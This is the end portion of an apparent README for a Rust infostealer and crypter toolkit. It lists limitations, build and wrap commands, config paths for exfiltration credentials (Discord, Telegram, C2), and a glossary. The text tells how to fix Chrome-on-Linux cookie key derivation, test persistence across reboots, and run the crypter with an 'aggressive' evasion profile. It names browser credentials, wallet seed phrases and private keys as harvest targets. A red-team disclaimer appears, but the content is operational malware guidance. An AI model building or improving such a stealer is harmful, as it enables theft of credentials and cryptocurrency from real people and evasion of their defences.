`ExecutionMethod` — the enum has five, but `pick_execution` chooses
from all of them while `emit_exec_fn` currently implements one common
in-memory loader per OS.

### 14.3 integrity checks return `true`

The `IntegrityCheck` enum has three variants, but all emitted bodies
return `true`. No actual self-integrity verification.

### 14.4 the VM dispatch is emitted but not called

`emit_vm.rs` produces a stack VM in every build where `virtualization`
is enabled, but nothing currently invokes `vm_run`. It's dead code.

### 14.5 macOS support is code-present but untested

`macos.rs` and `svc-loader/macos.rs` exist and look correct, but no
end-to-end test has been run. `aarch64-apple-darwin` cross-compile from
Linux requires an SDK (osxcross) — this hasn't been set up.

### 14.6 persistence paths are emitted but not tested

The persistence code is present in `windows.rs` / `linux.rs` / `macos.rs`,
but no reboot test has been run. Run once with a directive that includes
`"persistence":["runkey"]`, reboot, and confirm the payload auto-starts.

### 14.7 Chrome-on-Linux master key derivation is a stub

`derive_linux_key()` in `linux.rs` uses a single HMAC round for speed.
The real derivation is PBKDF2-HMAC-SHA1 with 1 iteration and the salt
`saltysalt`. Replace the inline HMAC with a proper PBKDF2 call before
real use.

### 14.8 no full process injection

The Windows loader runs in-memory in the current process. It does not
hollow or inject into another process. For WDAC/AppLocker environments
where only signed binaries can load, the payload won't run.

### 14.9 build_id is baked but not read

The stub writes a `BUILD_ID` static. The payload's `sysinfo` doesn't
read it. One-line addition to `SysInfo::collect` in `crates/common/src/sysinfo.rs`
would flow it into every envelope.

### 14.10 C2 is one-way

The C2 channel accepts POSTs from the payload. There's no tasking loop —
you can't send commands to a running payload or trigger an uninstall
remotely. You'd need to bake a new binary with a new directive and
deliver it again.

---

## 15. note

Built for authorized red team engagements and personal lab use. The
stealer harvests real credentials and the crypter is designed to evade
detection. Do not run on systems you do not own or do not have explicit
written authorization to test.

The wrapper's secret-loading path prints a warning if the secrets file
is group- or world-readable on Unix. Use `chmod 600 ~/.config/svc/secrets.json`.

---

## appendix A — quick reference

```bash
# build everything
cargo build --release -p svc-crypter -p svc-payload -p ops-watcher

# cross-compile the payload
cargo build --release -p svc-payload --target x86_64-pc-windows-gnu
cargo build --release -p svc-payload --target x86_64-unknown-linux-gnu

# wrap
cargo run --release -p svc-crypter -- \
    target/x86_64-pc-windows-gnu/release/svc-payload.exe \
    --target windows --profile aggressive --out mybuild

# run the wrapped binary (Linux)
SVC_SECRETS_PATH=$HOME/.config/svc/secrets.json \
  ./out/mybuild/target/x86_64-unknown-linux-gnu/release/mybuild

# watch for exfil
./target/release/ops-watcher
```

## appendix B — file paths

| Path | Purpose |
|---|---|
| `~/.config/svc/secrets.json` | exfil credentials (Discord, Telegram, C2) |
| `~/.config/svc/watcher.json` | ops-watcher config (bot token, channel, key) |
| `~/.config/svc/watcher.state.json` | last-seen Discord message ID |
| `~/.config/svc/directive.json` | optional: tiers + persistence config |
| `ops/blobs/` | extracted nested blobs from the watcher |
| `out/<name>/` | crypter output per build |
| `out/<name>/src/main.rs` | emitted stub source |
| `out/<name>/payload.bin` | encrypted payload embedded in the stub |
| `target/<triple>/release/` | compiled binaries |

## appendix C — glossary

| Term | Meaning |
|---|---|
| **stub** | the outer wrapper program in a crypter |
| **payload** | the inner program the stub decrypts and runs |
| **crypter** | a tool that encrypts + wraps + obfuscates a payload |
| **PE / ELF / Mach-O** | Windows / Linux / macOS executable formats |
| **PEB** | Process Environment Block — Windows struct listing loaded modules |
| **DPAPI** | Windows Data Protection API — user-scoped encryption |
| **Keychain** | macOS credential storage |
| **libsecret** | Linux credential storage (GNOME Keyring) |
| **memfd** | Linux kernel primitive for in-memory files |
| **execveat** | Linux syscall to exec from a file descriptor |
| **VirtualAlloc** | Windows API to allocate memory in a process |
| **CreateThread** | Windows API to start a new thread |
| **Argon2id** | memory-hard KDF, current best practice |
| **AES-GCM** | authenticated symmetric encryption |
| **ChaCha20-Poly1305** | alternative to AES-GCM, faster on some CPUs |
| **BIP-39** | standard for seed phrases (12 or 24 words) |
| **WIF** | Bitcoin private key format |
| **leveldb** | key-value store used by Chrome extensions |
| **SQLite** | database used by Chrome for cookies/autofill |
| **ISA** | instruction set architecture |
| **polymorphic** | changes shape every build |
| **metamorphic** | changes shape every run |
| **EDR** | Endpoint Detection and Response — behavioral security tool |
| **sandbox** | isolated environment for running suspicious files |
| **gate** | an anti-analysis check in the stub |
| **spool** | in-memory queue of undelivered exfil payloads |
| **envelope** | the JSON wrapper around exfil event data |
| **seal** | encrypt + base64 the envelope |
| **tag** | category label on an exfil event (`sysinfo`, `ext_vaults`, ...) |
```
